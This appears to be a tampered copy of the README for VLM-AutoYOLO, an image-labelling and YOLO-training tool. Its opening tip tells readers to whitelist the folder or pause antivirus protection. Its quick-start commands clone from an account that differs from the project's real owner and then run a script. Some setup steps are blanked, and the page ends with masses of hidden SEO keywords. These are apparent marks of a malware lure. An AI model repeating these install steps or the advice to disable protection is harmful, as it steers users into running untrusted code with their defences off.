# VLM-AutoYOLO


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO.git
cd VLM-AutoYOLO
python run.py
```


[简体中文](README_ZH.md) | English

<p align="center">
  <img src="https://img.shields.io/badge/License-AGPL%20v3-blue.svg" alt="License">
  <img src="https://img.shields.io/badge/Python-3.12+-blue" alt="Python">
  <img src="https://img.shields.io/badge/Node.js-22+-green" alt="Node.js">
  <img src="https://img.shields.io/badge/Platform-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey" alt="Platform">
  <img src="https://img.shields.io/badge/GPU-MPS%20%7C%20CUDA-orange" alt="GPU">
  <a href="mailto:somnusochi@gmail.com"><img src="https://img.shields.io/badge/Open_to_Work-🤝-brightgreen?style=flat" alt="Open to Work"></a>
  <img src="https://img.shields.io/github/stars/Somnusochi/VLM-AutoYOLO?style=social" alt="Stars">
</p>

```
🖼️ image/video → 🔍 VLM / SAM3 detection → 🎯 SAM2/SAM3 mask → ✏️ refine → 📦 export → 🚀 YOLO → ✅ model
```

**Images or videos in → YOLO model out**, with VLM auto-labeling (LocateAnything-3B), SAM2.1 / SAM3 mask refinement, and human-in-the-loop correction. Multi-format export, one-click YOLO training (detect & segment), video keyframe extraction, and model validation — all GPU-accelerated on macOS MPS and Windows/Linux CUDA.

![Architecture](docs/architecture_en.png)

> See [Architecture & Workflow Documentation](docs/architecture_diagram_en.md) for detailed Mermaid diagrams.

## Key Features
- 🤖 **VLM auto-labeling**: Open-vocabulary object detection with LocateAnything-3B
- 🎯 **SAM2 / SAM3 segmentation**: Bbox → pixel-precise mask with SAM 2.1 or SAM3 text-driven detection+segmentation in one pass, BBox/Mask toggle on canvas
- 🎥 **Video annotation**: Intelligent keyframe extraction (scene / motion / interval), SSIM dedup
- ✏️ **Manual refinement**: Canvas draw mode, NMS filtering, hide/show individual boxes
- 📦 **Multi-format export/import**: YOLO, YOLO-Seg, COCO JSON, Pascal VOC XML, CreateML JSON — import datasets via chunked ZIP upload (max 10GB, resume support)
- 🚀 **Training queue**: Sequential job processing with cancel support, one-click training (YOLOv8 / v11 / v26) with real-time SSE progress
- ✅ **Model validation**: Batch image / video testing, MJPEG live stream, SSE video inference
- 💾 **Smart model management**: Lazy loading, idle auto-unload, MPS/CUDA strategy pattern cleanup
- 🌐 **i18n**: English / 简体中文 / 日本語 · 🎨 **Theme**: Light / dark mode

## Documentation

📚 **[User Guide (English)](docs/guide/en/README.md)** | 📚 **[用户指南 (中文)](docs/guide/README.md)**

Comprehensive guides: quick start, annotation best practices, training parameter tuning, model deployment.

## Screenshots

| VLM Pre-annotation & Refinement | YOLO Training |
|--------------------------------|---------------|
| ![VLM pre-annotation and refinement](docs/1.png) | ![YOLO training](docs/2.png) |

| Video Keyframe Entry | Model Validation |
|---------------------|-----------------|
| ![Video keyframe entry](docs/4.png) | ![Model validation](docs/3.png) |

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Visual Grounding | NVIDIA LocateAnything-3B (Qwen2.5-3B + MoonViT) |
| Segmentation | SAM 2.1 / SAM3 — Segment Anything Model 2 / 3 |
| Object Detection | YOLOv8 / v11 / v26 — Detect & Segment (Ultralytics) |
| Backend | Python FastAPI + PostgreSQL + SSE |
| Frontend | React + TypeScript + Vite + Tailwind CSS + antd |
| GPU Memory | Strategy Pattern (`gpu_memory.py`) — CUDA expandable segments / MPS synchronize + empty_cache |
| State | Zustand + TanStack Query + ahooks |
| i18n | i18next (English / 简体中文 / 日本語) |
| Video | ffmpeg (scene / motion / interval extraction) |
| Tooling | pnpm, ESLint, Prettier, Husky, commitlint, Playwright |


### CLI (Recommended for macOS / Linux)

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO
cd VLM-AutoYOLO
python3 cli.py all
```


**Commands:**
```bash
python3 cli.py all                       # Setup + download models + start
python3 cli.py all --no-models           # Skip model download
python3 cli.py all --models=vlm          # Only download VLM model
python3 cli.py all --models=vlm,sam2     # Download VLM + SAM2
python3 cli.py setup                     # Install deps + init DB
python3 cli.py start                     # Launch services
python3 cli.py stop                      # Stop services
python3 cli.py status                    # Check if running
python3 cli.py download --models=vlm     # Re-download specific model
```

### Docker Deployment

> **Requirements:** Linux or Windows (WSL2) with NVIDIA GPU + [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html).
> **macOS is not supported** — Docker on Mac has no GPU passthrough. Use [Manual Setup](#manual-setup) instead.

**Quick start with pre-built images:**

```bash
docker compose up -d
open http://localhost        # Frontend
open http://localhost:8000/docs  # API docs
```

**Build from source:**

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO
cd VLM-AutoYOLO
docker compose up -d --build
```

**Services:**

| Service | Port | Description |
|---------|------|-------------|
| Frontend | 80 | React web UI (Nginx) |
| Backend | 8000 | FastAPI server |
| SAM3 | 8002 | SAM3 standalone inference service |
| Database | 5432 | PostgreSQL |

**GPU Support** — `docker-compose.yml` now has built-in GPU passthrough configured. No manual editing required.

**Persistent Storage (Docker volumes):**
- `pgdata` — Database · `model-cache` — VLM, SAM2 & SAM3 models · `uploads` — User images/videos · `training-data` — YOLO training outputs

**Backup / Restore:**

```bash
docker compose exec db pg_dump -U postgres autolabeling > backup.sql
cat backup.sql | docker compose exec -T db psql -U postgres autolabeling
```

### Manual Setup

**Requirements:**

| Resource | Minimum | Recommended |
|----------|---------|-------------|
| Python | 3.12+ | 3.12+ |
| Node.js | 22+ | 22+ |
| PostgreSQL | 16+ | 16+ |
| ffmpeg | Any | — |
| macOS | Apple Silicon 16GB | 24GB+ |
| NVIDIA GPU | 12GB VRAM | 16GB+ |

**Setup:**

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO
cd VLM-AutoYOLO

# Backend
cd backend
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
cd ..

# Frontend
cd frontend
cd ..

# Database (PostgreSQL recommended, but SQLite is supported out of the box)
# If using PostgreSQL:
# psql -d postgres -c "CREATE DATABASE autolabeling;"
# cp backend/.env.example backend/.env
# If you prefer a zero-setup SQLite database, just skip the two steps above. The system will auto-generate autolabeling.db

# Migrations
cd backend
PYTHONPATH=. alembic upgrade head
```

**Pre-download models (optional):**

```bash
huggingface-cli download nvidia/LocateAnything-3B --local-dir backend/model
```

**Launch:**

```bash
./start.sh   # macOS / Linux
start.bat    # Windows
```

| Service | URL |
|---------|-----|
| Frontend | http://localhost:5173 |
| Backend | http://localhost:8000 |
| API Docs | http://localhost:8000/docs |

## Project Structure

Full directory tree: **[docs/STRUCTURE.md](docs/STRUCTURE.md)**

## Features

### VLM Pre-annotation

Upload images or video keyframes with open-vocabulary descriptions (e.g. `fire, smoke`, `red car`). LocateAnything-3B automatically detects and draws bounding boxes.

- Open-vocabulary natural language descriptions
- Auto-resize by long-side cap (VRAM-based: 800–1333px)
- Batch upload folders or video keyframes, streaming results

### SAM2 Segmentation

Enable SAM2 (Segment Anything Model 2) to refine VLM bounding boxes into pixel-precise masks.

- Check "Enable SAM2 Segmentation" before detection — runs automatically after VLM
- SAM 2.1 model (base+), lazy-loaded with idle auto-unload
- Score threshold slider for mask quality filtering
- Masks rendered as semi-transparent overlays on canvas
- BBox and Mask independently toggled on both main canvas and hover preview
- Result table shows polygon vertex count per box

### SAM3 Detection + Segmentation

Switch to SAM3 mode for text-driven detection and segmentation in a single pass — no VLM required.

- Toggle between VLM+SAM2 and SAM3 via the model selector in the sidebar
- Enter open-vocabulary text prompts (e.g. `cat`, `red car`) — SAM3 detects and segments all matching instances
- **Confidence threshold** slider (0.0–1.0, default 0.5) controls detection sensitivity
- **Mask threshold** slider (0.0–1.0, default 0.5) controls mask tightness
- Enable/disable segmentation independently — bbox-only mode skips mask extraction for faster results
- SAM3 runs as a standalone HTTP service on port 8002 with its own venv (`backend/sam3-venv/`)
- **Requires `HF_TOKEN`** — set this env var before starting the backend. Two steps:
  1. Open [huggingface.co/facebook/sam3](https://huggingface.co/facebook/sam3) in browser, click **"Agree and access repository"**
  2. Create a **Read** token at [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens) (no need for Fine-grained — a plain Read token inherits your account's permissions)
  Model cached in `~/.cache/huggingface/hub/` after first download
- Auto-starts on first use, idle auto-unload after 10 min
- Real-time loading status via SSE (`starting` → `loading` → `loaded`)
- Manual unload button to free GPU memory
- Backend auto-switches: using SAM3 unloads VLM/SAM2, and vice versa
- Detection records tagged with `model_type` (VLM / VLM+SAM2 / SAM3) for traceability

### Video Annotation

Upload a video, extract keyframes, select and batch-annotate.

- **Three extraction modes**: scene change, motion detection (optical flow), fixed interval
- **SSIM deduplication**: auto-removes near-duplicate frames
- **Timeline preview**: horizontal scrollable strip, click for full-size view
- **Multi-select**: check frames, select/cancel all, load to annotation queue

### Manual Annotation

Canvas-based annotation with View / Draw modes.

- Category quick-fill from history
- VLM pre-annotation baseline → delete mistakes → draw missing boxes
- All / Best / NMS filter modes, settings saved per detection
- Hide individual boxes while inspecting dense results
- Per-frame re-detection

### History Management

- Thumbnail + category tag previews, tag-based multi-select filtering
- Click to view details, re-detect with updated labels, virtual scroll with infinite loading
- Single / batch export in **5 formats**: YOLO, YOLO-Seg, COCO JSON, Pascal VOC XML, CreateML JSON
- Format selection via dropdown menu, one-click zip download

### YOLO Training

- **Series**: YOLOv8 / v11 / v26 (n/s/m/l/x)
- **Task types**: Object Detection (Detect), Instance Segmentation (Segment)
- Segmentation training auto-uses SAM2 polygon labels; falls back to bbox when unavailable
- Tag filter + thumbnail preview for precise data selection
- Virtual scroll with "Load All" button for large datasets
- Dataset split presets (70/20/10, 80/20, 90/10, 60/20/20)
- Real-time SSE progress: Epoch / Loss / mAP50
- Rename training jobs for easier identification
- Auto ONNX export; download PT / ONNX / dataset zip

### Model Validation

- **Dual source**: trained models or externally uploaded `.pt` files
- **Conf / IoU sliders** for real-time threshold tuning
- **Batch image validation** with bounding boxes and confidence scores
- **Video validation** (three modes):
  - MJPEG live stream with interactive play/pause
  - SSE prediction stream with per-frame JSON events
  - Sync batch prediction — all frames at once
- Temporary results; export predictions as YOLO `.txt` files

### Model Management

- **Lazy loading**: VLM, SAM2, and SAM3 load on first use, unload after idle (default 10 min)
- **Idle watchdog**: all three models auto-unload after `MODEL_IDLE_TIMEOUT_SECONDS` of inactivity
- **Unified SSE status**: `GET /api/v1/model/events` streams VLM, SAM2, SAM3 status in one connection
- **Manual unload**: each model has its own unload button and API endpoint
- **GPU memory**: Strategy Pattern (`gpu_memory.py`) — CUDA `expandable_segments` / MPS `synchronize`+`empty_cache`+`gc`

## API Reference

Full API documentation with request/response examples: **[docs/API.md](docs/API.md)**

## Cross-Platform

| Platform | Inference | Training |
|----------|-----------|----------|
| macOS (Apple Silicon) | MPS | MPS |
| Linux / Windows (NVIDIA) | CUDA | CUDA |

Auto-detection: CUDA → MPS. Override via `DEVICE` env. **CPU not supported.**

## Inference Benchmarks

Tested locally on an **Apple MacBook Pro (M4 Pro, 24GB Unified Memory)** using Apple MPS hardware acceleration.

| Image Resolution (Max Side) | Inference Latency | Actual Memory Footprint |
| :--- | :--- | :--- |
| **Thumbnail (256px)** | `~0.68s` | Stable around `~11.8GB` |
| **High-Res (1024px)** | `~4.35s` | Stable around `~11.8GB` |

Full detailed benchmarks across different hardware configurations: **[docs/BENCHMARKS.md](docs/BENCHMARKS.md)**

## Highlights

- **MPS / CUDA full-pipeline GPU acceleration** — VLM, SAM2, and YOLO training all GPU-accelerated
- **Strategy Pattern GPU memory** — `gpu_memory.py` centralizes CUDA / MPS cleanup; `expandable_segments:True`
- **SAM2 / SAM3 mask refinement** — SAM2 refines VLM bboxes; SAM3 does text-driven detection+segmentation in one pass
- **5 export formats** — YOLO, YOLO-Seg, COCO, Pascal VOC, CreateML
- **Detect & Segment training** — polygon labels auto-used when SAM2 masks are available
- **Cross-platform** — macOS MPS, Windows / Linux CUDA, unified codebase
- **Unified SSE model status** — single EventSource for VLM, SAM2, SAM3 states; no polling

## Development

```bash
# Frontend

# Backend
cd backend && source .venv/bin/activate
PYTHONPATH=. alembic upgrade head
python -m compileall app alembic
```

## Stargazers

[![Star History Chart](https://api.star-history.com/svg?repos=Somnusochi/VLM-AutoYOLO&type=Date)](https://star-history.com/#Somnusochi/VLM-AutoYOLO&Date)

## License

Code: [AGPL-3.0](LICENSE).

Third-party dependencies:
- LocateAnything-3B model — [NVIDIA License](https://huggingface.co/nvidia/LocateAnything-3B/blob/main/LICENSE) (non-commercial use only)
- SAM3 model — [Facebook Research License](https://huggingface.co/facebook/sam3) (gated repository, requires HuggingFace access token)
- Ultralytics YOLO — [AGPL-3.0](https://github.com/ultralytics/ultralytics/blob/main/LICENSE) (copyleft; training/deployment may trigger obligations)

---

If this project helps you, please ⭐ [star it on GitHub](https://github.com/Somnusochi/VLM-AutoYOLO). I'm open to new opportunities — reach out: somnusochi@gmail.com


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- VLM-AutoYOLO - tool utility software - download install setup -->
<!-- local VLM-AutoYOLO tool | free download VLM-AutoYOLO service | reliable VLM-AutoYOLO framework | VLM-AutoYOLO creator | download portable VLM-AutoYOLO | free VLM-AutoYOLO binding | download for linux VLM-AutoYOLO clone | modular VLM-AutoYOLO clone | guide online VLM-AutoYOLO converter | tutorial production ready VLM-AutoYOLO addon | customizable VLM-AutoYOLO | quick start VLM-AutoYOLO fork | arch secure VLM-AutoYOLO cli | new version VLM-AutoYOLO editor | 2025 fast VLM-AutoYOLO parser | fedora VLM-AutoYOLO alternative | wiki VLM-AutoYOLO uploader | simple VLM-AutoYOLO module | configurable VLM-AutoYOLO tester | reliable VLM-AutoYOLO generator | configurable VLM-AutoYOLO | quick start VLM-AutoYOLO checker | execute VLM-AutoYOLO | open source VLM-AutoYOLO monitor | stable VLM-AutoYOLO package | run VLM-AutoYOLO tester | download for mac VLM-AutoYOLO extractor | sample VLM-AutoYOLO optimizer | linux VLM-AutoYOLO copy | download for mac VLM-AutoYOLO logger | centos native VLM-AutoYOLO | documentation VLM-AutoYOLO server | get VLM-AutoYOLO client | quickstart VLM-AutoYOLO framework | run on windows VLM-AutoYOLO decoder | demo VLM-AutoYOLO | offline VLM-AutoYOLO gui | low latency VLM-AutoYOLO | how to run open source VLM-AutoYOLO | github VLM-AutoYOLO scanner | run on mac minimal VLM-AutoYOLO | how to use VLM-AutoYOLO port | docs VLM-AutoYOLO tracker | cross platform VLM-AutoYOLO service | VLM AutoYOLO handbook | setup VLM-AutoYOLO port | open VLM-AutoYOLO creator | offline VLM-AutoYOLO editor | self hosted VLM-AutoYOLO extractor | how to run VLM-AutoYOLO -->
<!-- ubuntu VLM-AutoYOLO web | configure high performance VLM-AutoYOLO | fedora VLM-AutoYOLO | wiki powerful VLM-AutoYOLO program | run on linux VLM-AutoYOLO builder | centos VLM-AutoYOLO clone | walkthrough VLM-AutoYOLO sdk | native VLM-AutoYOLO cli | demo VLM-AutoYOLO tester | deploy VLM-AutoYOLO monitor | walkthrough VLM-AutoYOLO gui | run VLM-AutoYOLO | open source VLM-AutoYOLO tracker | latest version VLM-AutoYOLO uploader | walkthrough VLM-AutoYOLO | extensible VLM-AutoYOLO | debian VLM-AutoYOLO mobile | guide configurable VLM-AutoYOLO sdk | VLM-AutoYOLO package | deploy VLM-AutoYOLO | guide simple VLM-AutoYOLO analyzer | safe VLM-AutoYOLO app | VLM AutoYOLO kubernetes | VLM AutoYOLO help | best VLM-AutoYOLO | sample VLM-AutoYOLO | quick start VLM-AutoYOLO extractor | cross platform VLM-AutoYOLO web | VLM AutoYOLO saas | VLM-AutoYOLO client | stable VLM-AutoYOLO | fedora modern VLM-AutoYOLO | online VLM-AutoYOLO fork | open source safe VLM-AutoYOLO | VLM AutoYOLO cloud | documentation VLM-AutoYOLO desktop | low latency VLM-AutoYOLO program | 2025 extensible VLM-AutoYOLO | github VLM-AutoYOLO | VLM-AutoYOLO platform | fedora VLM-AutoYOLO analyzer | free VLM AutoYOLO | run on mac safe VLM-AutoYOLO | launch VLM-AutoYOLO monitor | arch VLM-AutoYOLO package | start VLM-AutoYOLO | open source VLM-AutoYOLO clone | low latency VLM-AutoYOLO cli | build VLM-AutoYOLO service | VLM-AutoYOLO checker -->
<!-- fedora advanced VLM-AutoYOLO | getting started reliable VLM-AutoYOLO | use VLM-AutoYOLO wrapper | get VLM-AutoYOLO | top VLM-AutoYOLO sdk | centos VLM-AutoYOLO encoder | sample customizable VLM-AutoYOLO | 2025 production ready VLM-AutoYOLO wrapper | VLM AutoYOLO podcast | centos VLM-AutoYOLO engine | open VLM-AutoYOLO editor | start high performance VLM-AutoYOLO | github VLM-AutoYOLO decoder | use github VLM-AutoYOLO | getting started VLM-AutoYOLO | modular VLM-AutoYOLO | download for linux modular VLM-AutoYOLO | how to run portable VLM-AutoYOLO | guide offline VLM-AutoYOLO | how to setup extensible VLM-AutoYOLO builder | lightweight VLM-AutoYOLO app | install VLM-AutoYOLO program | VLM-AutoYOLO software | how to build best VLM-AutoYOLO | VLM AutoYOLO automation | low latency VLM-AutoYOLO analyzer | 2026 VLM-AutoYOLO gui | how to setup VLM-AutoYOLO viewer | 2025 VLM-AutoYOLO analyzer | execute VLM-AutoYOLO uploader | free download VLM-AutoYOLO cli | modern VLM-AutoYOLO compressor | free download VLM-AutoYOLO tester | VLM AutoYOLO test | safe VLM-AutoYOLO | top VLM AutoYOLO | use configurable VLM-AutoYOLO extension | open VLM-AutoYOLO compressor | cross platform VLM-AutoYOLO sdk | minimal VLM-AutoYOLO builder | getting started VLM-AutoYOLO gui | github VLM-AutoYOLO sdk | easy VLM-AutoYOLO mobile | open source VLM-AutoYOLO reader | guide VLM-AutoYOLO checker | VLM-AutoYOLO module | offline VLM-AutoYOLO | 2026 VLM-AutoYOLO program | VLM-AutoYOLO port | github low latency VLM-AutoYOLO -->
<!-- VLM-AutoYOLO replacement | docs VLM-AutoYOLO | best VLM AutoYOLO | online VLM-AutoYOLO | top VLM-AutoYOLO framework | VLM-AutoYOLO addon | tutorial advanced VLM-AutoYOLO | docs production ready VLM-AutoYOLO wrapper | production ready VLM-AutoYOLO mirror | launch extensible VLM-AutoYOLO | beginner VLM-AutoYOLO platform | free VLM-AutoYOLO replacement | VLM AutoYOLO demo | guide VLM-AutoYOLO port | advanced VLM-AutoYOLO replacement | VLM-AutoYOLO reader | deploy VLM-AutoYOLO builder | run on linux lightweight VLM-AutoYOLO | online VLM-AutoYOLO binding | high performance VLM-AutoYOLO downloader | VLM-AutoYOLO utility | demo VLM-AutoYOLO app | deploy VLM-AutoYOLO downloader | get VLM-AutoYOLO fork | use VLM-AutoYOLO fork | VLM-AutoYOLO scanner | download for windows VLM-AutoYOLO extension | modular VLM-AutoYOLO viewer | example VLM-AutoYOLO module | tar.gz VLM-AutoYOLO app | configure free VLM-AutoYOLO | download VLM-AutoYOLO | how to setup reliable VLM-AutoYOLO library | download for linux VLM-AutoYOLO | VLM AutoYOLO course | github VLM-AutoYOLO validator | ubuntu VLM-AutoYOLO app | launch VLM-AutoYOLO reader | updated configurable VLM-AutoYOLO compressor | free download VLM-AutoYOLO | VLM-AutoYOLO tool | VLM-AutoYOLO framework | local VLM-AutoYOLO program | how to download VLM-AutoYOLO plugin | deploy safe VLM-AutoYOLO | fedora VLM-AutoYOLO converter | 2025 VLM-AutoYOLO app | free VLM-AutoYOLO copy | how to run VLM-AutoYOLO scanner | VLM-AutoYOLO generator -->
<!-- arch modular VLM-AutoYOLO platform | advanced VLM-AutoYOLO optimizer | how to build VLM-AutoYOLO platform | setup VLM-AutoYOLO replacement | use VLM-AutoYOLO debugger | 2026 VLM-AutoYOLO port | how to use VLM-AutoYOLO application | setup VLM-AutoYOLO optimizer | best VLM-AutoYOLO mobile | best VLM-AutoYOLO clone | online VLM-AutoYOLO clone | VLM-AutoYOLO compressor | 2026 safe VLM-AutoYOLO | docs VLM-AutoYOLO editor | examples VLM-AutoYOLO wrapper | examples configurable VLM-AutoYOLO server | configure VLM-AutoYOLO decoder | macos VLM-AutoYOLO tester | run VLM-AutoYOLO engine | updated high performance VLM-AutoYOLO downloader | start VLM-AutoYOLO generator | examples VLM-AutoYOLO engine | wiki VLM-AutoYOLO alternative | launch reliable VLM-AutoYOLO viewer | build stable VLM-AutoYOLO | new version VLM-AutoYOLO clone | get VLM-AutoYOLO builder | sample VLM-AutoYOLO compressor | VLM-AutoYOLO validator | VLM-AutoYOLO binding | github customizable VLM-AutoYOLO | linux VLM-AutoYOLO sdk | VLM AutoYOLO book | quickstart powerful VLM-AutoYOLO | tar.gz VLM-AutoYOLO parser | guide VLM-AutoYOLO creator | windows VLM-AutoYOLO server | arch extensible VLM-AutoYOLO validator | configurable VLM-AutoYOLO builder | VLM-AutoYOLO desktop | examples VLM-AutoYOLO module | VLM-AutoYOLO tester | build VLM-AutoYOLO checker | ubuntu easy VLM-AutoYOLO service | run self hosted VLM-AutoYOLO cli | free VLM-AutoYOLO server | how to download VLM-AutoYOLO creator | VLM AutoYOLO pipeline | git clone VLM-AutoYOLO uploader | VLM-AutoYOLO extension -->
<!-- compile VLM-AutoYOLO debugger | download for mac minimal VLM-AutoYOLO server | high performance VLM-AutoYOLO mobile | windows VLM-AutoYOLO replacement | configurable VLM-AutoYOLO validator | powerful VLM-AutoYOLO fork | VLM-AutoYOLO clone | github VLM-AutoYOLO alternative | self hosted VLM-AutoYOLO package | beginner VLM-AutoYOLO tool | example VLM-AutoYOLO plugin | run on windows powerful VLM-AutoYOLO debugger | reliable VLM-AutoYOLO | VLM-AutoYOLO monitor | VLM-AutoYOLO viewer | latest version VLM-AutoYOLO | centos VLM-AutoYOLO tool | use VLM-AutoYOLO package | run on windows production ready VLM-AutoYOLO | execute VLM-AutoYOLO binding | VLM-AutoYOLO uploader | fast VLM-AutoYOLO fork | how to configure reliable VLM-AutoYOLO tracker | use easy VLM-AutoYOLO clone | arch VLM-AutoYOLO framework | git clone VLM-AutoYOLO | download online VLM-AutoYOLO | 2026 VLM-AutoYOLO package | examples VLM-AutoYOLO | advanced VLM-AutoYOLO viewer | modular VLM-AutoYOLO encoder | VLM-AutoYOLO optimizer | source code VLM-AutoYOLO | quick start VLM-AutoYOLO package | macos VLM-AutoYOLO converter | VLM AutoYOLO bug | new version VLM-AutoYOLO mirror | ubuntu VLM-AutoYOLO desktop | free VLM-AutoYOLO cli | tutorial modern VLM-AutoYOLO reader | deploy customizable VLM-AutoYOLO | guide VLM-AutoYOLO utility | free VLM-AutoYOLO extractor | cross platform VLM-AutoYOLO wrapper | get online VLM-AutoYOLO | execute cross platform VLM-AutoYOLO program | tar.gz VLM-AutoYOLO | debian VLM-AutoYOLO | quickstart VLM-AutoYOLO tester | native VLM-AutoYOLO tool -->
<!-- example VLM-AutoYOLO | git clone VLM-AutoYOLO viewer | examples configurable VLM-AutoYOLO | VLM-AutoYOLO decoder | run on mac VLM-AutoYOLO app | free VLM-AutoYOLO | quickstart VLM-AutoYOLO replacement | how to run VLM-AutoYOLO analyzer | VLM AutoYOLO ci cd | beginner VLM-AutoYOLO editor | install VLM-AutoYOLO optimizer | compile VLM-AutoYOLO desktop | modular VLM-AutoYOLO fork | how to deploy VLM-AutoYOLO scanner | tar.gz VLM-AutoYOLO plugin | configure VLM-AutoYOLO extension | VLM AutoYOLO tutorial | VLM AutoYOLO reddit | VLM-AutoYOLO mobile | 2026 top VLM-AutoYOLO server | free VLM-AutoYOLO framework | safe VLM-AutoYOLO fork | execute VLM-AutoYOLO validator | VLM AutoYOLO support | modular VLM-AutoYOLO decoder | example VLM-AutoYOLO mirror | simple VLM-AutoYOLO | github VLM-AutoYOLO port | macos VLM-AutoYOLO server | debian VLM-AutoYOLO uploader | self hosted VLM-AutoYOLO generator | low latency VLM-AutoYOLO application | compile VLM-AutoYOLO mirror | examples VLM-AutoYOLO program | macos portable VLM-AutoYOLO downloader | high performance VLM-AutoYOLO alternative | stable VLM-AutoYOLO addon | zip VLM-AutoYOLO tool | start VLM-AutoYOLO plugin | production ready VLM-AutoYOLO service | run easy VLM-AutoYOLO converter | examples powerful VLM-AutoYOLO | minimal VLM-AutoYOLO monitor | download for linux safe VLM-AutoYOLO | download VLM-AutoYOLO viewer | offline VLM-AutoYOLO web | VLM-AutoYOLO cli | launch VLM-AutoYOLO app | debian VLM-AutoYOLO parser | compile VLM-AutoYOLO -->
<!-- sample best VLM-AutoYOLO | customizable VLM-AutoYOLO library | github VLM-AutoYOLO extension | production ready VLM-AutoYOLO scanner | arch fast VLM-AutoYOLO | configure VLM-AutoYOLO editor | how to download VLM-AutoYOLO | linux VLM-AutoYOLO | execute VLM-AutoYOLO clone | github VLM-AutoYOLO addon | easy VLM-AutoYOLO decoder | launch VLM-AutoYOLO engine | quickstart VLM-AutoYOLO encoder | local VLM-AutoYOLO | modern VLM-AutoYOLO package | get best VLM-AutoYOLO | configure VLM-AutoYOLO copy | windows VLM-AutoYOLO | github VLM-AutoYOLO tester | getting started VLM-AutoYOLO cli | use advanced VLM-AutoYOLO | VLM AutoYOLO vs | open source VLM-AutoYOLO parser | VLM-AutoYOLO alternative | run on windows VLM-AutoYOLO generator | portable VLM-AutoYOLO encoder | run on mac portable VLM-AutoYOLO | download for windows VLM-AutoYOLO desktop | how to install VLM-AutoYOLO | fast VLM-AutoYOLO analyzer | demo VLM-AutoYOLO compressor | customizable VLM-AutoYOLO fork | how to deploy configurable VLM-AutoYOLO | quick start best VLM-AutoYOLO | new version cross platform VLM-AutoYOLO | fast VLM-AutoYOLO reader | secure VLM-AutoYOLO builder | tutorial VLM-AutoYOLO web | setup VLM-AutoYOLO desktop | VLM-AutoYOLO builder | safe VLM-AutoYOLO binding | customizable VLM-AutoYOLO generator | easy VLM-AutoYOLO monitor | tutorial VLM-AutoYOLO optimizer | download for windows VLM-AutoYOLO replacement | VLM-AutoYOLO sdk | quickstart VLM-AutoYOLO scanner | centos VLM-AutoYOLO | how to download VLM-AutoYOLO reader | cross platform VLM-AutoYOLO framework -->
<!-- how to install VLM-AutoYOLO sdk | use VLM-AutoYOLO mobile | powerful VLM-AutoYOLO | VLM-AutoYOLO server | centos VLM-AutoYOLO reader | run on windows VLM-AutoYOLO library | top VLM-AutoYOLO tracker | configure VLM-AutoYOLO | run on linux VLM-AutoYOLO wrapper | run on mac VLM-AutoYOLO | latest version VLM-AutoYOLO binding | configure safe VLM-AutoYOLO utility | modern VLM-AutoYOLO framework | cross platform VLM-AutoYOLO | secure VLM-AutoYOLO module | high performance VLM-AutoYOLO scanner | how to build VLM-AutoYOLO alternative | quick start VLM-AutoYOLO desktop | secure VLM-AutoYOLO desktop | top VLM-AutoYOLO replacement | best VLM-AutoYOLO package | how to configure VLM-AutoYOLO scanner | run on windows VLM-AutoYOLO platform | is VLM AutoYOLO safe | beginner VLM-AutoYOLO utility | open VLM-AutoYOLO extractor | documentation VLM-AutoYOLO | VLM AutoYOLO article | download for mac online VLM-AutoYOLO | zip VLM-AutoYOLO editor | secure VLM-AutoYOLO | VLM-AutoYOLO web | start minimal VLM-AutoYOLO | build VLM-AutoYOLO sdk | download VLM-AutoYOLO decoder | how to use VLM-AutoYOLO gui | modular VLM-AutoYOLO mobile | install VLM-AutoYOLO gui | wiki VLM-AutoYOLO extractor | latest version fast VLM-AutoYOLO app | debian modular VLM-AutoYOLO clone | ubuntu VLM-AutoYOLO mirror | safe VLM-AutoYOLO validator | VLM-AutoYOLO program | tar.gz VLM-AutoYOLO reader | debian powerful VLM-AutoYOLO scanner | download for mac VLM-AutoYOLO clone | arch VLM-AutoYOLO | github VLM-AutoYOLO logger | VLM-AutoYOLO extractor -->
<!-- start VLM-AutoYOLO reader | advanced VLM-AutoYOLO | wiki top VLM-AutoYOLO | 2026 VLM-AutoYOLO | example VLM-AutoYOLO desktop | fedora VLM-AutoYOLO logger | open source VLM-AutoYOLO desktop | deploy native VLM-AutoYOLO | portable VLM-AutoYOLO desktop | production ready VLM-AutoYOLO | updated open source VLM-AutoYOLO tester | git clone VLM-AutoYOLO scanner | minimal VLM-AutoYOLO copy | run VLM-AutoYOLO clone | VLM-AutoYOLO engine | high performance VLM-AutoYOLO creator | safe VLM-AutoYOLO server | getting started VLM-AutoYOLO desktop | macos VLM-AutoYOLO validator | run on mac VLM-AutoYOLO copy | examples VLM-AutoYOLO mirror | arch VLM-AutoYOLO debugger | free VLM-AutoYOLO logger | configure minimal VLM-AutoYOLO | start VLM-AutoYOLO client | VLM-AutoYOLO tracker | VLM-AutoYOLO service | minimal VLM-AutoYOLO | how to deploy fast VLM-AutoYOLO | quick start advanced VLM-AutoYOLO | how to configure production ready VLM-AutoYOLO | how to setup online VLM-AutoYOLO | debian VLM-AutoYOLO tester | ubuntu VLM-AutoYOLO sdk | docs VLM-AutoYOLO mobile | VLM AutoYOLO not working | best VLM-AutoYOLO plugin | arch VLM-AutoYOLO software | latest version VLM-AutoYOLO logger | 2025 free VLM-AutoYOLO monitor | arch VLM-AutoYOLO compressor | free github VLM-AutoYOLO framework | tutorial VLM-AutoYOLO | updated VLM-AutoYOLO tool | stable VLM-AutoYOLO encoder | how to install native VLM-AutoYOLO | how to deploy VLM-AutoYOLO clone | VLM-AutoYOLO mirror | debian open source VLM-AutoYOLO | easy VLM-AutoYOLO -->

<!-- Last updated: 2026-06-09 19:26:54 -->
